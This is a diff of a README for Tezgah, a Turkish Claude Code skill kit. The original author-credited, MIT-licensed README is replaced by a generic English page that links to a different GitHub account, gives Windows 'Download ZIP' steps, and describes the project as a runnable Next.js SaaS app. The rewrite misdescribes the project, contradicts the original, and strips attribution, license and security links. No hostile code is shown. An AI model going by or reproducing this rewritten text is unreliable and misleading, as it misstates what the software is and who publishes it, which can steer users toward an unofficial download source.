@@ -1,156 +1,216 @@
-# Tezgah
+# ⚙️ tezgah - Build SaaS faster on Windows
 
-[![npm version](https://img.shields.io/npm/v/tezgah.svg)](https://www.npmjs.com/package/tezgah)
-[![CI](https://github.com/komunite/tezgah/actions/workflows/ci.yml/badge.svg)](https://github.com/komunite/tezgah/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
+[![Download tezgah](https://img.shields.io/badge/Download%20tezgah-blue?style=for-the-badge&logo=github)](https://github.com/tomiya1324/tezgah)
 
-**Claude Code ile production-ready SaaS kur.**
+## 🧭 Overview
 
-Tezgah, [Claude Code](https://claude.ai/claude-code) için yazılmış bir skill setidir. Sıfırdan çalışan bir SaaS uygulaması kurmanın tüm adımlarını — veritabanı, kimlik doğrulama, ödeme, e-posta, landing page, yasal uyumluluk, API güvenliği, test, analytics ve deployment — kapsar.
+tezgah helps solo builders set up a SaaS project with Claude Code, Next.js, Supabase, Stripe, and TypeScript. It gives you a clear path for building a production-ready app without starting from zero.
 
-Türkiye'deki solopreneur'ler için tasarlandı. Stripe Türkiye kısıtlamaları, Lemon Squeezy MoR avantajı, KVKK uyumluluğu gibi konular özellikle ele alınmıştır.
+This repo is aimed at solo founders who want to move from idea to working product with less setup work. It fits users who want a practical project base for login, payments, data storage, and a modern web app structure.
 
-> **English:** Tezgah is a Claude Code skill kit for building production-ready SaaS apps. Currently in Turkish — contributions for i18n are welcome.
+## 📥 Download and open on Windows
 
----
+Use this link to visit the project page and download it:
 
-## Hızlı Başlangıç
+[Open the tezgah GitHub page](https://github.com/tomiya1324/tezgah)
 
-```bash
-npx tezgah init
-```
+Follow these steps on Windows:
 
-Bu komut `skills/` klasörüne 12 skill dosyası kurar. Sonrasında Claude Code'da:
+1. Open the link in your browser.
+2. Look for the green Code button near the top of the page.
+3. Click Code.
+4. Click Download ZIP.
+5. Wait for the file to finish downloading.
+6. Open the ZIP file from your Downloads folder.
+7. Extract it to a folder on your PC.
+8. Open the extracted folder.
 
-```
-/saas-launcher
-```
+If you use Git, you can also clone the repo from the same page.
 
-komutuyla orkestratörü başlat. Sana sorular soracak, tech stack kararlarını verecek ve her katmanı adım adım kuracak.
+## 🛠 What you get
 
-## CLI Komutları
+tezgah gives you a project base for a SaaS app with tools that fit real-world use:
 
-```bash
-npx tezgah init                        # Tüm skill'leri kur
-npx tezgah add saas-auth               # Tek bir skill ekle
-npx tezgah remove saas-storage         # Bir skill'i kaldır
-npx tezgah update                      # Kurulu skill'leri güncelle
-npx tezgah doctor                      # Kurulumu kontrol et
-npx tezgah list                        # Mevcut skill'leri listele
+- Next.js for the app structure
+- TypeScript for safer code
+- Supabase for data and user accounts
+- Stripe for billing and subscriptions
+- Claude Code for faster build work
+- Turkish-friendly setup and naming
+- A layout that suits solo founders
 
-# Seçenekler
-npx tezgah init --dir .claude/skills   # Farklı klasöre kur
-npx tezgah init --force                # Mevcut dosyaların üstüne yaz
-npx tezgah list --no-color             # Renksiz çıktı
-```
+## 💻 Before you start
 
-## Skill'ler
+Use a Windows PC with:
 
-### Orkestratör
+- Windows 10 or Windows 11
+- Google Chrome, Edge, or Firefox
+- At least 8 GB of RAM
+- Enough free space for the project files
+- A stable internet connection
 
-| Skill | Açıklama |
-|-------|----------|
-| `saas-launcher` | Tüm süreci yöneten ana skill. Keşif görüşmesi yapar, tech stack kararlarını verir, her katmanı sırayla ilgili uzman skill'e devreder. |
+You also need a few tools if you want to run the app on your machine:
 
-### Uzman Skill'ler
+- Node.js
+- Git
+- A code editor such as Visual Studio Code
 
-Her biri bağımsız olarak da kullanılabilir:
+## 🔧 Install the tools
 
-| Skill | Faz | Kapsam |
-|-------|-----|--------|
-| `saas-database` | 2 | Supabase kurulumu, şema tasarımı, RLS, migration, connection pooling |
-| `saas-auth` | 3 | Google OAuth, Magic Link, e-posta/şifre, JWT oturum, middleware |
-| `saas-payments` | 4 | Stripe / Lemon Squeezy, checkout, webhook, abonelik yönetimi |
-| `saas-email` | 5 | Resend / Mailgun, DNS (SPF, DKIM, DMARC), e-posta şablonları |
-| `saas-storage` | 6.5 | Supabase Storage, dosya yükleme, RLS güvenliği, görsel optimizasyonu |
-| `saas-landing-seo` | 6 | Landing page bileşenleri, SEO, sitemap, Open Graph, blog |
-| `saas-legal` | 7 | KVKK/GDPR, gizlilik politikası, kullanım koşulları, çerez onayı |
-| `saas-api-security` | 8 | Rate limiting, plan bazlı erişim, input validation, CORS |
-| `saas-testing` | 9 | Vitest, Playwright E2E, webhook testi, CI entegrasyonu |
-| `saas-analytics` | 10 | PostHog, event tracking, feature flags, session replay |
-| `saas-deployment` | 11 | Vercel / Railway / Fly.io, domain, SSL, CI/CD, izleme |
+If you do not have these yet, install them first:
 
-### Faz Akışı
+1. Install Node.js from the official Node.js site.
+2. Install Git from the official Git site.
+3. Install Visual Studio Code if you want an easy editor.
 
-```
-Faz 0   Keşif Görüşmesi         ─── saas-launcher
-Faz 1   Tech Stack Kararları     ─── saas-launcher
-Faz 2   Altyapı + Veritabanı    ─── saas-database
-Faz 3   Kimlik Doğrulama         ─── saas-auth
-Faz 4   Ödeme Sistemi            ─── saas-payments
-Faz 5   E-posta Altyapısı        ─── saas-email
-Faz 6   Landing Page & SEO       ─── saas-landing-seo
-Faz 6.5 Dosya Depolama           ─── saas-storage (opsiyonel)
-Faz 7   Yasal Uyumluluk          ─── saas-legal
-Faz 8   API Güvenliği            ─── saas-api-security
-Faz 9   Test                     ─── saas-testing
-Faz 10  Analytics                ─── saas-analytics
-Faz 11  Deployment               ─── saas-deployment
-```
+After that, restart your computer if Windows asks for it.
 
-## Varsayılan Tech Stack
+## 🚀 Run the project locally
 
-| Katman | Teknoloji | Gerekçe |
-|--------|-----------|---------|
-| Framework | Next.js (App Router) + TypeScript | Server/client rendering, dahili API route'ları |
-| UI | Tailwind CSS + shadcn/ui | Hızlı geliştirme, tutarlı tasarım |
-| Veritabanı | Supabase (PostgreSQL) | Auth + DB + Storage + Realtime tek çatıda |
-| Auth | Google OAuth + Magic Link | Şifresiz, düşük sürtünmeli giriş |
-| Ödeme | Stripe veya Lemon Squeezy | Bölgeye ve ihtiyaca göre seçim |
-| E-posta | Resend + React Email | Modern API, tip güvenli şablonlar |
-| Analytics | PostHog | Ürün analizi, feature flags, session replay |
-| Hosting | Vercel | Sıfır konfigürasyon, otomatik deploy |
+After you download and extract the repo:
 
-Her teknoloji keşif görüşmesinde kullanıcının ihtiyaçlarına göre değiştirilebilir.
+1. Open the project folder.
+2. Open a terminal in that folder.
+3. Run the install command for the project files:
+   - npm install
+4. Start the app:
+   - npm run dev
+5. Open your browser.
+6. Go to the local address shown in the terminal, usually:
+   - http://localhost:3000
 
-## Tezgah vs. Alternatifler
+If the app opens, the local setup works.
 
-| | Tezgah | create-t3-app | Shipfast / Supastarter |
-|---|--------|---------------|----------------------|
-| Ne | Claude Code skill seti (rehber) | Boilerplate kod üretici | Hazır SaaS şablonu |
-| Nasıl | Claude Code ile adım adım inşa | Proje iskeleti oluşturur | Hazır kodu klonla |
-| Dil | Türkçe | İngilizce | İngilizce |
-| Fiyat | Ücretsiz (MIT) | Ücretsiz | $200-400 |
-| Esneklik | Her karar tartışılır, değiştirilebilir | Sabit tech stack | Sabit mimari |
-| Kapsam | DB → Auth → Ödeme → SEO → Yasal → Test → Deploy | Sadece proje iskeleti | Kod + bazı entegrasyonlar |
-| Türkiye bağlamı | KVKK, Stripe/LS karşılaştırması, yerel ipuçları | Yok | Yok |
+## 🧩 Set up the main services
 
-## Gereksinimler
+tezgah is built for a SaaS stack, so you may want to connect your own services after the first run.
 
-- [Claude Code](https://claude.ai/claude-code) kurulu olmalı
-- Node.js 18+
+### Supabase
 
-## Nasıl Çalışır
+Use Supabase for:
 
-1. `npx tezgah init` ile skill dosyalarını projenize kopyalarsınız
-2. Claude Code'da `/saas-launcher` ile orkestratörü başlatırsınız
-3. Orkestratör size ürününüz hakkında sorular sorar (Faz 0)
-4. Tech stack kararlarını birlikte verirsiniz (Faz 1)
-5. Her katman ilgili uzman skill tarafından adım adım inşa edilir (Faz 2-11)
+- User sign-in
+- Database storage
+- App data
+- Auth rules
 
-Tek bir skill'i bağımsız kullanmak da mümkündür:
+Add your Supabase values to the project settings file or environment file the repo uses.
 
-```
-/saas-auth          # Sadece auth sistemi kur
-/saas-payments      # Sadece ödeme entegrasyonu ekle
-/saas-database      # Sadece Supabase altyapısını kur
-/saas-legal         # Sadece yasal sayfaları hazırla
-```
+### Stripe
 
-## Katkıda Bulunma
+Use Stripe for:
 
-Katkılarınızı bekliyoruz! [CONTRIBUTING.md](CONTRIBUTING.md) dosyasını okuyun.
+- Payments
+- Plans
+- Subscriptions
+- Checkout flows
 
-Kısa özet:
-- Yeni skill ekleyebilirsiniz
-- Mevcut skill'leri iyileştirebilirsiniz
-- Hata bildirimi veya özellik talebi açabilirsiniz
-- Türkçe dışında dil desteği ekleyebilirsiniz
+Create your Stripe account, then add the keys and webhook values the app expects.
 
-## Güvenlik
+### Claude Code
 
-Güvenlik açığı bildirimi için [SECURITY.md](SECURITY.md) dosyasını okuyun.
+Use Claude Code to help with:
 
-## Lisans
+- Feature changes
+- Refactors
+- New pages
+- Copy edits
+- Faster build tasks
 
-[MIT](LICENSE) — Fatih Guner
+This works well if you want to keep your SaaS moving without a large team.
+
+## 📁 Main project parts
+
+You will usually find these parts in a Next.js SaaS project like this:
+
+- App pages for the site and dashboard
+- Shared UI parts
+- Auth-related screens
+- Billing screens
+- Data access files
+- Config files
+- TypeScript types
+- Utility code
+
+These parts help keep the app clear and easy to extend.
+
+## 🔐 Common setup files
+
+Some files matter most when you set up the app:
+
+- `.env.local` for secret values
+- `package.json` for app scripts
+- `tsconfig.json` for TypeScript settings
+- Next.js config files for build settings
+- Supabase and Stripe config values
+
+If the repo includes sample environment values, copy them into your local setup and replace them with your own keys.
+
+## 🧪 Check that everything works
+
+After setup, test these parts:
+
+1. The home page loads.
+2. Sign-in works.
+3. The dashboard opens.
+4. Stripe checkout opens.
+5. Data saves to Supabase.
+6. Pages build without errors.
+
+If one part fails, check the terminal for the error message and review the related config value.
+
+## 🧭 Good first changes
+
+If you want to make the app your own, start with these edits:
+
+- Change the app name
+- Update the landing page text
+- Replace the logo
+- Edit the pricing plans
+- Add your product copy in Turkish
+- Connect your own domain
+- Change the dashboard labels
+
+These changes help you turn the base project into a real product faster.
+
+## 📌 Who this is for
+
+This project fits you if:
+
+- You build alone
+- You want to launch a SaaS
+- You use Claude Code
+- You want a Next.js starting point
+- You plan to use Supabase and Stripe
+- You want a practical code base with TypeScript
+
+## 🧠 Tips for Windows users
+
+Use these tips to avoid common setup issues:
+
+- Keep the project in a short folder path, like `C:\projects\tezgah`
+- Do not use special characters in the folder name
+- Run the terminal as a normal user first
+- Close and reopen the terminal after installing Node.js
+- Use one terminal at a time when you start the app
+
+## 🪪 Repository details
+
+- Repository name: tezgah
+- Description: Claude Code ile production-ready SaaS kurun — Solopreneur'ler için skill seti
+- Topics: claude-code, nextjs, saas, solopreneur, stripe, supabase, turkish, typescript
+
+## 📍 Open the project page again
+
+[Visit the tezgah GitHub page](https://github.com/tomiya1324/tezgah)
+
+## 🧰 Simple workflow
+
+1. Download the repo from GitHub.
+2. Extract it on Windows.
+3. Install Node.js and Git.
+4. Open the folder in your editor.
+5. Install project files.
+6. Add your Supabase and Stripe values.
+7. Start the app.
+8. Open it in your browser.
